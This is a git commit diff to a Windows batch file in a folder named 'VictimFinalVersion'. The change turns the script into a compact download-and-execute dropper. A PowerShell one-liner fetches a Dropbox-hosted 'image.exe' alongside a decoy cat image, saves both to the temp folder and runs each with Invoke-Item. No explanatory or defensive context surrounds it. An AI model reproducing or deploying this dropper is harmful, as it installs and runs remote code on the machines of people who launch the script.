8694d2a6132c567ffdb417db83b2373b5f3e8e8e
devkaare <kaarehofferdal@gmail.com>
2025-02-02 04:06:35 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -1,9 +1,5 @@
 @echo off
+
 set files="https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0" "https://www.cats.org.uk/media/6099/laptop-cat-meme-400px.jpg?width=400&height=306"
 
-for %%i in (%files%) do (
-    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%%i', 'C:\Users\user1\Downloads\' + [System.IO.Path]::GetFileName('%%i'))"
-)
-
-echo Download completed!
-pause
+powershell.exe -Command "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
